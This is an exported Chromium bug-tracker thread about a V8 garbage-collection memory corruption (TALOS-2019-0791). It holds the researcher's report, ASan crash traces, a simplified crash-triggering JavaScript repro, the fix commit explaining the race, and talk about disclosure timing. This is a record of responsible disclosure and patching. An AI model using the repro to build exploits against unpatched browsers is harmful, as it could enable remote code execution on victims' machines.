# Security: Google V8 Array.prototype Memory Corruption Vulnerability (TALOS-2019-0791)

| Field | Value |
|-------|-------|
| **Issue ID** | [40094304](https://issues.chromium.org/issues/40094304) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>GarbageCollection |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | [Deleted User] |
| **Assignee** | ml...@chromium.org |
| **Created** | 2019-03-15 |
| **Bounty** | $2,000.00 |

## Description

### Summary

A specific JavaScript code can trigger a memory corruption in V8 7.3.492.17 which could potentially be abused for remote code execution. In order to trigger this vulnerability in the context of a browser, such as Google Chrome, the victim would need to visit a malicious web page.

## Attachments

- [Google vulnerability Report_TALOS-2019-0791.zip.gpg](attachments/Google vulnerability Report_TALOS-2019-0791.zip.gpg) (application/octet-stream, 8.4 KB)
- [Google vulnerability Report_TALOS-2019-0791.zip](attachments/Google vulnerability Report_TALOS-2019-0791.zip) (application/octet-stream, 8.8 KB)
- [google_v8_array_prototype_memory_corruption_poc.js](attachments/google_v8_array_prototype_memory_corruption_poc.js) (text/plain, 1.7 KB)

## Timeline

### wf...@chromium.org (2019-03-15)

Thanks for your bug report.

Please do not use encrypted attachments but just attach reports as a plain text comment to this bug. This site uses SSL and access restrictions so it's safe to do so.


### [Deleted User] (2019-03-15)

New file attached 

### wf...@chromium.org (2019-03-15)

2019-MM-DD (published patch date)
TALOS-2019-0791
CVE-2019-XXXX 


Google V8 Array.prototype Memory Corruption Vulnerability


### Summary

A specific JavaScript code can trigger a memory corruption in V8 7.3.492.17 which could potentially be abused for remote code execution. In order to trigger this vulnerability in the context of a browser, such as Google Chrome, the victim would need to visit a malicious web page.



### Tested Versions

Google V8 7.3.492.17 


### Product URLs

[https://v8.dev](https://v8.dev)


### CVSSv3 Score

7.5 - CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H


### CWE

???


### Details

V8 is the core Javascript engine that runs Chrome browser. As part of Chrome and node.js, it is the most popular JavaScript engine today. 

While executing the JavaScript code of the supplied PoC, it would appear that manipulating the contents and properties of `Array.prototype` could lead to an invalid pointer dereference when accessing an array element after garbage collection. This results in the following crash:

    AddressSanitizer:DEADLYSIGNAL
    =================================================================
    ==7584==ERROR: AddressSanitizer: SEGV on unknown address 0x7ef007002f78 (pc 0x5613555d06a5 bp 0x7ffe4c045870 sp 0x7ffe4c045870 T0)
    ==7584==The signal is caused by a READ memory access.
        #0 0x5613555d06a4 in Relaxed_Load ./build/v8/v8/v8/out/asan/../../src/base/atomicops_internals_portable.h:183
        #1 0x5613555d06a4 in Relaxed_Load<unsigned long> ./build/v8/v8/v8/out/asan/../../src/base/atomic-utils.h:78
        #2 0x5613555d06a4 in Relaxed_Load ./build/v8/v8/v8/out/asan/../../src/objects/slots-inl.h:43
        #3 0x5613555d06a4 in map_word ./build/v8/v8/v8/out/asan/../../src/objects-inl.h:817
        #4 0x5613555d06a4 in map ./build/v8/v8/v8/out/asan/../../src/objects-inl.h:757
        #5 0x5613555d06a4 in IsSymbol ./build/v8/v8/v8/out/asan/../../src/objects/instance-type-inl.h:70
        #6 0x5613555d06a4 in IsSymbol ./build/v8/v8/v8/out/asan/../../src/objects-inl.h:119
        #7 0x5613555d06a4 in IsSymbol ./build/v8/v8/v8/out/asan/../../src/api.cc:3351
        #8 0x5613555d06a4 in ?? ??:0
        #9 0x5613555600ae in v8::WriteToFile(_IO_FILE*, v8::FunctionCallbackInfo<v8::Value> const&) ./build/v8/v8/v8/out/asan/../../src/d8.cc:1214
        #10 0x5613555600ae in ?? ??:0
        #11 0x5613555603ea in WriteAndFlush ./build/v8/v8/v8/out/asan/../../src/d8.cc:1234
        #12 0x5613555603ea in Print ./build/v8/v8/v8/out/asan/../../src/d8.cc:1240
        #13 0x5613555603ea in ?? ??:0
        #14 0x56135572b04c in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) ./build/v8/v8/v8/out/asan/../../src/api-arguments-inl.h:146
        #15 0x56135572b04c in ?? ??:0
        #16 0x561355728d72 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) ./build/v8/v8/v8/out/asan/../../src/builtins/builtins-api.cc:109
        #17 0x561355728d72 in ?? ??:0
        #18 0x561355726914 in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) ./build/v8/v8/v8/out/asan/../../src/builtins/builtins-api.cc:139
        #19 0x561355726914 in ?? ??:0
        #20 0x56135727032a in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit snapshot-external.cc:?
        #21 0x56135727032a in ?? ??:0
        #22 0x5613571d4976 in Builtins_InterpreterEntryTrampoline snapshot-external.cc:?
        #23 0x5613571d4976 in ?? ??:0
        #24 0x5613571ce17f in Builtins_ArgumentsAdaptorTrampoline snapshot-external.cc:?
        #25 0x5613571ce17f in ?? ??:0
        #26 0x5613571d4976 in Builtins_InterpreterEntryTrampoline snapshot-external.cc:?
        #27 0x5613571d4976 in ?? ??:0
        #28 0x5613571ce17f in Builtins_ArgumentsAdaptorTrampoline snapshot-external.cc:?
        #29 0x5613571ce17f in ?? ??:0
        #30 0x56135729fd44 in Builtins_SortCompareUserFn snapshot-external.cc:?
        #31 0x56135729fd44 in ?? ??:0
        #32 0x5613572a32a7 in Builtins_ArrayTimSort snapshot-external.cc:?
        #33 0x5613572a32a7 in ?? ??:0
        #34 0x5613572a3f82 in Builtins_ArrayPrototypeSort snapshot-external.cc:?
        #35 0x5613572a3f82 in ?? ??:0
        #36 0x5613571d4976 in Builtins_InterpreterEntryTrampoline snapshot-external.cc:?
        #37 0x5613571d4976 in ?? ??:0
        #38 0x5613571d4976 in Builtins_InterpreterEntryTrampoline snapshot-external.cc:?
        #39 0x5613571d4976 in ?? ??:0
        #40 0x5613571d221f in Builtins_JSEntryTrampoline snapshot-external.cc:?
        #41 0x5613571d221f in ?? ??:0
        #42 0x5613571d1fac in Builtins_JSEntry snapshot-external.cc:?
        #43 0x5613571d1fac in ?? ??:0
        #44 0x561356067b0c in Call ./build/v8/v8/v8/out/asan/../../src/simulator.h:124
        #45 0x561356067b0c in Invoke ./build/v8/v8/v8/out/asan/../../src/execution.cc:266
        #46 0x561356067b0c in ?? ??:0
        #47 0x561356067085 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) ./build/v8/v8/v8/out/asan/../../src/execution.cc:358
        #48 0x561356067085 in ?? ??:0
        #49 0x5613555bb9ee in v8::Script::Run(v8::Local<v8::Context>) ./build/v8/v8/v8/out/asan/../../src/api.cc:2173
        #50 0x5613555bb9ee in ?? ??:0
        #51 0x561355555ca7 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::Value>, v8::Shell::PrintResult, v8::Shell::ReportExceptions, v8::Shell::ProcessMessageQueue) ./build/v8/v8/v8/out/asan/../../src/d8.cc:533
        #52 0x561355555ca7 in ?? ??:0
        #53 0x56135556ca05 in v8::SourceGroup::Execute(v8::Isolate*) ./build/v8/v8/v8/out/asan/../../src/d8.cc:2466
        #54 0x56135556ca05 in ?? ??:0
        #55 0x56135557270a in v8::Shell::RunMain(v8::Isolate*, int, char**, bool) ./build/v8/v8/v8/out/asan/../../src/d8.cc:2947
        #56 0x56135557270a in ?? ??:0
        #57 0x561355576848 in v8::Shell::Main(int, char**) ./build/v8/v8/v8/out/asan/../../src/d8.cc:3499
        #58 0x561355576848 in ?? ??:0
        #59 0x7f6c5b5ea82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
        #60 0x7f6c5b5ea82f in ?? ??:0

    AddressSanitizer can not provide additional info.
    SUMMARY: AddressSanitizer: SEGV (./d8+0xb716a4)
    ==7584==ABORTING


The supplied PoC code was tested, with same results, on the current beta branch as well as the latest dev version of v8. All built with AddressSanitizer enabled, in non-debug mode. The supplied PoC that triggers the crash isn't 100% reliable and doesn't trigger in builds without AddressSanitizer enabled, or in builds with optimizations disabled which would aid in debugging. Ultimately, we were unable to determine the exact root cause of this crash in timely manner because of these issues. 

When run with certain debug flags, we can get additional information from v8's debug console - d8: 

    d8 --disable-in-process-stack-traces --trace-opt-verbose  --allow-natives-syntax  --trace-gc  poc.js


The above AddressSanitizer crash occurs when an array element of `v3` is being accessed in the poc line:

    try{    print(v3[v.length-1]);}catch(e){}


Using `DebugTrace` right before it, shows the following context information:

    [object Object]
    after f2
    2000
    before regex
    [7584:0x62f000000400]     9662 ms: Mark-sweep 45.1 (74.9) -> 14.9 (47.5) MB, 1.8 / 0.0 ms  (+ 0.8 ms in 4 steps since start of marking, biggest step 0.8 ms, walltime since start of marking 37 ms) (average mu = 0.997, current mu = 0.996) finalize incremental marking via stack guard GC in old space requested
    before f2
    f2 147 999862

    ==== JS stack trace =========================================

        0: ExitFrame [pc: 0x561357270566]
        1: StubFrame [pc: 0x5613572b3e2f]
    Security context: 0x7e8ad7f19329 <JSObject>#0#
        2: f2 [0x7e8ad7f1e101] [poc_orig.js:23] [bytecode=0x7e8ad7f1e669 offset=49](this=0x7ecf13180bb9 <JSGlobal Object>#1#,0x7eef3c1804d1 <undefined>,0x7eef3c1804d1 <undefined>,0x7eef3c1804d1 <undefined>)
        3: arguments adaptor frame: 0->3
        4: f1 [0x7e8ad7f1e169] [poc_orig.js:54] [bytecode=0x7ecf13180469 offset=659](this=0x7ecf13180bb9 <JSGlobal Object>#1#,0,0,0x7eef3c1804d1 <undefined>)
        5: arguments adaptor frame: 2->3
        6: StubFrame [pc: 0x56135729fd45]
        7: StubFrame [pc: 0x5613572a32a8]
        8: sort [0x7e8ad7f103e1](this=0x7ecf13180c61 <JSArray[2000]>#2#,0x7e8ad7f1e169 <JSFunction f1 (sfi = 0x7e8ad7f1dcb9)>#3#)
        9: main [0x7e8ad7f1e099] [poc_orig.js:17] [bytecode=0x7e8ad7f1e2e9 offset=94](this=0x7ecf13180bb9 <JSGlobal Object>#1#)
       10: /* anonymous */ [0x7e8ad7f1de01] [poc_orig.js:61] [bytecode=0x7e8ad7f1dd79 offset=32](this=0x7ecf13180bb9 <JSGlobal Object>#1#)
       11: InternalFrame [pc: 0x5613571d2220]
       12: EntryFrame [pc: 0x5613571d1fad]

    ==== Details ================================================

    [0]: ExitFrame [pc: 0x561357270566]
    [1]: StubFrame [pc: 0x5613572b3e2f]
    [2]: f2 [0x7e8ad7f1e101] [poc_orig.js:23] [bytecode=0x7e8ad7f1e669 offset=49](this=0x7ecf13180bb9 <JSGlobal Object>#1#,0x7eef3c1804d1 <undefined>,0x7eef3c1804d1 <undefined>,0x7eef3c1804d1 <undefined>) {
      // expression stack (top to bottom)
      [05] : 0x7eef3c1804d1 <undefined>
      [04] : 0x7eef3c1804d1 <undefined>
      [03] : 0x7eef3c1804d1 <undefined>
      [02] : 0x7e8ad7f0fdb9 <JSArray[999862]>#4#
      [01] : 0x7eba7b975b59 <String[13]: f2 147 999862>
      [00] : 0x7e8ad7f19cd9 <JSFunction print (sfi = 0x7e8ad7f19ca1)>#5#
    --------- s o u r c e   c o d e ---------
    function f2(arg1, arg2, arg3) { \x0a\x09print("f2 " + r2 + " " + Array.prototype.length);\x0a\x09%DebugTrace();\x0atry{\x09print(v3[v.length-1]);}catch(e){}\x0a\x09r2++; if( r2>5) return;\x0a\x09// initially , get the Array.prototype and change it\x0a\x09v = Array.prototype.fill(100);\x0a\x09// make length non zero\x0a\x09v.splice(Infinity,"a",5,v4); // inf...

    -----------------------------------------
    }

    [3]: arguments adaptor frame: 0->3 {
    }

    [4]: f1 [0x7e8ad7f1e169] [poc_orig.js:54] [bytecode=0x7ecf13180469 offset=659](this=0x7ecf13180bb9 <JSGlobal Object>#1#,0,0,0x7eef3c1804d1 <undefined>) {
      // expression stack (top to bottom)
      [11] : 0x7ecf13180bb9 <JSGlobal Object>#1#
      [10] : 106
      [09] : 99
      [08] : 14
      [07] : 0x7e8ad7f09071 <JSFunction String (sfi = 0x7eef5c9076b1)>#6#
      [06] : 0x7efca05c5e71 <String[3]\: \x0ecj>
      [05] : 0x7efca05c3e39 <JSArray[1025]>#7#
      [04] : 0x7e8ad7f104c1 <JSFunction join (sfi = 0x7eef5c906e39)>#8#
      [03] : 0x7efca05c96b9 <Very long string[480795]>#9#
      [02] : 0x7e8ad7f04b71 <Object map = 0x7edb177809f9>#10#
      [01] : 0x7ecf13180221 <String[#9]: before f2>
      [00] : 0x7e8ad7f1e101 <JSFunction f2 (sfi = 0x7e8ad7f1dc61)>#11#
    --------- s o u r c e   c o d e ---------
    function f1(arg1, arg2, arg3) { \x0aprint(v3.length);\x0a//it can either crash when removing an item and shifting v or when printing it in f\x0av.shift();\x0aprint("before regex");\x0a\x0a\x0a//causes both memory and cpu pressure, laaaarge string that keeps json parser busy for a while\x0atry { v5 = JSON.parse(\x0a\x09""+ Array(1025).join(...

    -----------------------------------------
    }

    [5]: arguments adaptor frame: 2->3 {
      // actual arguments
      [00] : 0
      [01] : 0
    }

    [6]: StubFrame [pc: 0x56135729fd45]
    [7]: StubFrame [pc: 0x5613572a32a8]
    [8]: sort [0x7e8ad7f103e1](this=0x7ecf13180c61 <JSArray[2000]>#2#,0x7e8ad7f1e169 <JSFunction f1 (sfi = 0x7e8ad7f1dcb9)>#3#) {
    // optimized frame
    --------- s o u r c e   c o d e ---------
    <No Source>
    -----------------------------------------
    }
    [9]: main [0x7e8ad7f1e099] [poc_orig.js:17] [bytecode=0x7e8ad7f1e2e9 offset=94](this=0x7ecf13180bb9 <JSGlobal Object>#1#) {
      // expression stack (top to bottom)
      [04] : 0x7e8ad7f1e169 <JSFunction f1 (sfi = 0x7e8ad7f1dcb9)>#3#
      [03] : 0x7ecf13180c61 <JSArray[2000]>#2#
      [02] : 0x7e8ad7f1e169 <JSFunction f1 (sfi = 0x7e8ad7f1dcb9)>#3#
      [01] : 0x7ecf13180c61 <JSArray[2000]>#2#
      [00] : 0x7e8ad7f103e1 <JSFunction sort (sfi = 0x7eef5c906cf9)>#12#
    --------- s o u r c e   c o d e ---------
    function main() {\x0a\x0a\x09f2();\x0a\x09v[1000000] = "a"; // grow Array.prototype to large size \x0a        Array.prototype.fill(0); //fill up Array.prototype\x0a\x09v3 = new Array(2000); // note that prototype is different now\x0a\x09v4 = {};   // next time f is called, v4 will be an empty object\x0a\x09v3.sort(f1); // will call f1 2000 times, ...

    -----------------------------------------
    }

    [10]: /* anonymous */ [0x7e8ad7f1de01] [poc_orig.js:61] [bytecode=0x7e8ad7f1dd79 offset=32](this=0x7ecf13180bb9 <JSGlobal Object>#1#) {
      // expression stack (top to bottom)
      [04] : 0x7ecf13180bb9 <JSGlobal Object>#1#
      [03] : 0x7e8ad7f1de01 <JSFunction (sfi = 0x7e8ad7f1da81)>#13#
      [02] : 0x7eef3c1804d1 <undefined>
      [01] : 0x7e8ad7f1e099 <JSFunction main (sfi = 0x7e8ad7f1dc09)>#14#
      [00] : 0x7eef3c1804d1 <undefined>
    --------- s o u r c e   c o d e ---------
    var r2 = 0;\x0avar v = 0; \x0avar v1;\x0avar v3;\x0avar v4; \x0avar v5;\x0avar tmp;\x0a\x0a\x0afunction main() {\x0a\x0a\x09f2();\x0a\x09v[1000000] = "a"; // grow Array.prototype to large size \x0a        Array.prototype.fill(0); //fill up Array.prototype\x0a\x09v3 = new Array(2000); // note that prototype is different now\x0a\x09v4 = {};   // next time f...

    -----------------------------------------
    }

    [11]: InternalFrame [pc: 0x5613571d2220]
    [12]: EntryFrame [pc: 0x5613571d1fad]
    ==== Key         ============================================

     #0# 0x7e8ad7f19329: 0x7e8ad7f19329 <JSObject>
     #1# 0x7ecf13180bb9: 0x7ecf13180bb9 <JSGlobal Object>
     #2# 0x7ecf13180c61: 0x7ecf13180c61 <JSArray[2000]>
     #3# 0x7e8ad7f1e169: 0x7e8ad7f1e169 <JSFunction f1 (sfi = 0x7e8ad7f1dcb9)>
     #4# 0x7e8ad7f0fdb9: 0x7e8ad7f0fdb9 <JSArray[999862]>
                     0: 100
                     1: 100
                     2: 100
                     3: 100
                     4: 100
                     5: 100
                     6: 100
                     7: 100
                     8: 100
                     9: 100
                      ...
     #5# 0x7e8ad7f19cd9: 0x7e8ad7f19cd9 <JSFunction print (sfi = 0x7e8ad7f19ca1)>
     #6# 0x7e8ad7f09071: 0x7e8ad7f09071 <JSFunction String (sfi = 0x7eef5c9076b1)>
     #7# 0x7efca05c3e39: 0x7efca05c3e39 <JSArray[1025]>
     #8# 0x7e8ad7f104c1: 0x7e8ad7f104c1 <JSFunction join (sfi = 0x7eef5c906e39)>
     #9# 0x7efca05c96b9: 0x7efca05c96b9 <Very long string[480795]>
     #10# 0x7e8ad7f04b71: 0x7e8ad7f04b71 <Object map = 0x7edb177809f9>
     #11# 0x7e8ad7f1e101: 0x7e8ad7f1e101 <JSFunction f2 (sfi = 0x7e8ad7f1dc61)>
     #12# 0x7e8ad7f103e1: 0x7e8ad7f103e1 <JSFunction sort (sfi = 0x7eef5c906cf9)>
     #13# 0x7e8ad7f1de01: 0x7e8ad7f1de01 <JSFunction (sfi = 0x7e8ad7f1da81)>
     #14# 0x7e8ad7f1e099: 0x7e8ad7f1e099 <JSFunction main (sfi = 0x7e8ad7f1dc09)>
    =====================


Also, since we enabled garbage collection tracing, it can be observed that memory corruption that leads to a crash always follows a specific garbage collection event:

    [7584:0x62f000000400]     9662 ms: Mark-sweep 45.1 (74.9) -> 14.9 (47.5) MB, 1.8 / 0.0 ms  (+ 0.8 ms in 4 steps since start of marking, biggest step 0.8 ms, walltime since start of marking 37 ms) (average mu = 0.997, current mu = 0.996) finalize incremental marking via stack guard GC in old space requested


This leads us to believe that this issue is related to garbage collection, which is a very sensitive part of JavaScript engine, and that it could be open for further abuse.


### Credit 

Discovered by Aleksandar Nikolic of Cisco Talos.
http://talosintelligence.com/vulnerability-reports/


### Timeline

2019-03-15 - Vendor Disclosure<br>
YYYY-MM-DD - Public Release



### wf...@chromium.org (2019-03-15)

Thanks for your report.

I can't get this PoC to trigger in a checkout of 7.3.492.17 asan build 64-bit. Maybe clusterfuzz will have better luck.

[Monorail components: Blink>JavaScript>GC]

### cl...@chromium.org (2019-03-15)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5079826353487872.

### cl...@chromium.org (2019-03-15)

Testcase 5079826353487872 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5079826353487872.

### wf...@chromium.org (2019-03-15)

CF can't repro either. Can you confirm the exact GN flags you are using to compile the d8 binary, and the exact rev?

### da...@chromium.org (2019-03-18)

[Empty comment from Monorail migration]

### ja...@chromium.org (2019-03-18)

I reproed with 

gn args:

is_component_build = false
is_debug = false
target_cpu = "x64"
use_goma = true
goma_dir = "/usr/local/google/home/jarin/goma"
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
is_asan = true

then I did 

git fetch && git checkout 7.3.492.17
ninja -C out/x64.release d8
out/x64.release/d8 poc.js --allow-natives-syntax --disable-in-process-stack-traces --trace-opt-verbose


### wf...@chromium.org (2019-03-18)

jarin I wonder if you could take a look at this bug, since you are able to repro?

### ha...@chromium.org (2019-03-19)

[Empty comment from Monorail migration]

### ja...@chromium.org (2019-03-19)

I am taking a look. This is tricky, as the submission says - it only reproes with asan on release builds.

### sh...@chromium.org (2019-03-19)

[Empty comment from Monorail migration]

### ja...@chromium.org (2019-03-20)

[Empty comment from Monorail migration]

### ja...@chromium.org (2019-03-20)

This a bug in Heap::MoveElements (invoked by Array.p.shift) where the write barrier does not update the remembered set (if the target of a slot is already black). This only triggers for large object arrays because we would use left trimming otherwise.

### ja...@chromium.org (2019-03-20)

For completeness, this reproduces on http://crrev.com/a59ca7358c4c25f1b1586bf505bf30c7324106ec

Simplified repro:

var v = Array.prototype.fill(100);
var v4 = {};

v[1000000] = "a"; // grow Array.prototype to large size
Array.prototype.fill(0); //fill up Array.prototype
v.splice(Infinity,"a",5,v4, 4, 3); // infinity is bigger than array length

for (let i = 0; i < 1000; i++) f1();

function f1() {
  v.shift();

  //causes both memory and cpu pressure, laaaarge string that keeps json parser busy for a while
  try { JSON.parse(
      ""+ Array(1025).join(String.fromCharCode(29, 72)) 
      + Array(4097).join(String.fromCharCode(65, 41)) 
      + Array(65537).join(String.fromCharCode(106, 59, 71)) 
      + Array(4097).join(String.fromCharCode(123, 2, 39)) 
      + Array(4097).join(String.fromCharCode(126, 36)) 
      + Array(1025).join(String.fromCharCode(67)) 
      + Array(1025).join(String.fromCharCode(21, 100)) 
      + Array(257).join(String.fromCharCode(82, 56, 119)) 
      + Array(1025).join(String.fromCharCode(14, 99, 106)) 
  ); } catch(e) { }

  %DebugPrint(v);
}

Run with:

out/x64.release/d8 poc.js --allow-natives-syntax --noturbo-inlining --noconcurrent-recompilation --trace-turbo-graph --noopt

Bunch of the flags (such as the compilation-related ones) seem to be only necessary to change the heap layout slightly. The repro is super-sensitive to gc timing details.

gn args:

is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
is_asan = true



### ml...@chromium.org (2019-03-20)

The objects involved in the bug are large objects and the object that is missing a slot is a young generation large object.

When we revisit objects for the marking barrier we use the incremental version of the FixedArray visitation. This visitation uses a progress bar and requires that we reset the progress bar before we start visitation. We only reset for LO space and not for NEW_LO_SPACE which means that we will miss the slot.

Preparing a fix and test.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-03-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/c4eae87a1a475bb2821725642c522f941b9472c9

commit c4eae87a1a475bb2821725642c522f941b9472c9
Author: Michael Lippautz <mlippautz@chromium.org>
Date: Thu Mar 21 09:21:58 2019

heap: Fix incremental-concurrent processing of large FixedArray

FixedArray object in LO space are processed incrementally in ranges of slots
size kProgressBarScanningChunk to reduce latency when returning to the
processing loop is critical. A progress bar stores how much slots have been
processed already.

In the case of regular concurrent marking there was a guarantee that the
object was only processed by one thread (main *or* concurrent marking
thread) at the same time.

However, some optimizations that avoid write barriers for each
individual write operation emit a batched write barrier that requires
re-visiting the FixedArray for the marking barrier. In such cases, the
progress bar would be reset using relaxed stores which is problematic as
the concurrent marking thread could race on setting its own progress on the
progress bar. As a result, the array would only be re-scanned partially.

The fix involves using CAS to set the progress bar and bail out in the
case an inconsistent state was observed.

In the following:
MT... main thread
CM... concurrent marking thread

The interesting cases are:
1. MT *or* CM processes the array without interfering: Progress bar is
   updated monotonically without failing.
3. MT interferes with itself: The progress bar is just reset and the main
   thread will restart scanning from index 0. The object is added twice to
   the marking worklist and processed each time one of the entries is
   retrieved from the worklist.
4. MT interferes with CM:
   4.a.: CM processes a range of slots and re-adds the left overs by
   setting the progress bar and re-adding the array to the worklist.  In
   this case CM *and* MT process the array from index 0. The first time
   the CAS for setting the progress bar fails on either of the threads,
   the looser will bail out and leave processing for the winner.
   4.b.: CM is interrupted while processing a range of the array and
   fails in setting the progress bar for the left overs. In this case
   the CM bails out right away and the main thread starts processing
   from index 0.

In addition, there is a transition from index 0 to the index of the
first actual slot. This transition makes it possible to observe a reset
while processing the first actual chunk of slots.

Bug: chromium:942699
Change-Id: I0b06f47ee075030dadfc959528cd77b6b69bbec2
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/1532325
Reviewed-by: Hannes Payer <hpayer@chromium.org>
Reviewed-by: Jaroslav Sevcik <jarin@chromium.org>
Commit-Queue: Michael Lippautz <mlippautz@chromium.org>
Cr-Commit-Position: refs/heads/master@{#60385}
[modify] https://crrev.com/c4eae87a1a475bb2821725642c522f941b9472c9/src/heap/concurrent-marking.cc
[modify] https://crrev.com/c4eae87a1a475bb2821725642c522f941b9472c9/src/heap/incremental-marking.cc
[modify] https://crrev.com/c4eae87a1a475bb2821725642c522f941b9472c9/src/heap/incremental-marking.h
[modify] https://crrev.com/c4eae87a1a475bb2821725642c522f941b9472c9/src/heap/mark-compact-inl.h
[modify] https://crrev.com/c4eae87a1a475bb2821725642c522f941b9472c9/src/heap/spaces.h
[modify] https://crrev.com/c4eae87a1a475bb2821725642c522f941b9472c9/test/cctest/heap/test-heap.cc


### ml...@chromium.org (2019-03-21)

The race was introduced here [1]. It first appeared on M73 [2].

Requesting merges after backing time on Canary.

[1] https://chromium-review.googlesource.com/c/v8/v8/+/1385164
[2] https://chromiumdash.appspot.com/commit/7ca8acd0a56aa17642629b473cad45f70598b6a4

### ml...@chromium.org (2019-03-21)

Requesting right away but we should still wait a bit.

### sh...@chromium.org (2019-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-22)

Your change meets the bar and is auto-approved for M74. Please go ahead and merge the CL to branch 3729 (refs/branch-heads/3729) manually. Please contact milestone owner if you have questions.
Merge instructions: https://www.chromium.org/developers/how-tos/drover
Owners: govind@(Android), kariahda@(iOS), dgagnon@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-03-25)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2019-03-25)

Pls merge your change to M74 branch 3729 ASAP so we can pick it up for this week beta release. Thank you.

### na...@google.com (2019-03-25)

[Empty comment from Monorail migration]

### go...@chromium.org (2019-03-26)

Pls merge your change to M74 branch 3729 ASAP so we can pick it up for this week beta release. Thank you.

### go...@chromium.org (2019-03-26)

Pls merge your change to M74 branch 3729 ASAP so we can pick it up for this week beta release. Thank you.

### ml...@chromium.org (2019-03-26)

This has been merged to V8's 7.4 branch in https://chromium-review.googlesource.com/c/v8/v8/+/1538134.

### na...@google.com (2019-03-26)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-03-26)

Congrats! The Panel decided to reward $2,000 for this report. 

### na...@google.com (2019-03-26)

[Empty comment from Monorail migration]

### na...@google.com (2019-03-26)

[Empty comment from Monorail migration]

### [Deleted User] (2019-03-27)

What information is needed for the reward payment?


### mb...@chromium.org (2019-04-03)

[Empty comment from Monorail migration]

### aw...@google.com (2019-04-17)

regiwils@ - has somebody been in touch about that via email?

### [Deleted User] (2019-04-18)

No, we have not received an email

### aw...@google.com (2019-04-22)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-04-22)

[Empty comment from Monorail migration]

### ml...@chromium.org (2019-04-23)

[Empty comment from Monorail migration]

### [Deleted User] (2019-04-23)

Is there a public disclosure release date?

### [Deleted User] (2019-04-23)

[Comment Deleted]

### [Deleted User] (2019-04-30)

We made note of the CVE on our end. Is there a public disclosure timeline?

### ul...@chromium.org (2019-04-30)

regiwils@, normally it is 14 weeks after the fix: https://dev.chromium.org/Home/chromium-security/security-faq#TOC-Can-you-please-un-hide-old-security-bugs-

### [Deleted User] (2019-04-30)

confirmed - we will make note on our end

### [Deleted User] (2019-04-30)

As time nears, an exact date or at least 1-2 business notice would be appreciated since issue will reach 90 days on 2019-06-15 and the 14 week timeline would push this into June 25, 2019 or so.

### [Deleted User] (2019-04-30)

As time nears, an exact date or at least 1-2 business days notice would be appreciated since issue will reach 90 days on 2019-06-15 and the 14 week timeline would push this into June 25, 2019 or so.

### [Deleted User] (2019-06-17)

Is there an exact date for the public disclosure date?

### wf...@chromium.org (2019-06-17)

https://www.timeanddate.com/date/dateadded.html?m1=03&d1=21&y1=2019&aw=14 gives an approximate idea.

### [Deleted User] (2019-06-18)

Thanks.The approximate is understood and mentioned back on 2019-04-30 and indicated that this would beyond 90 days.In efforts for a coordinated public disclosure date, as time nears, we prefer an EXACT date. Hence, the inquiry was for exact and not approximate. 

### [Deleted User] (2019-06-26)

Any updates?

### wf...@chromium.org (2019-06-26)

Our systems automatically derestrict the bugs when it has been determined that the bug has been fixed for long enough, typically 14 weeks. However, if you need an exact date/time, I can mark the bug embargoed and manually derestrict the bug on a mutually agreed date beyond 14 weeks, so any time after 27 June 2019. Let me know if you want to do this, and the date you wish the bug to be opened.

### aw...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

### [Deleted User] (2019-06-27)

If you can open the bug before end of month 2019-06-30, that would be good. We will publicly disclose on our end on 2019-07-01.

### sh...@chromium.org (2019-06-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/942699?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/947923]
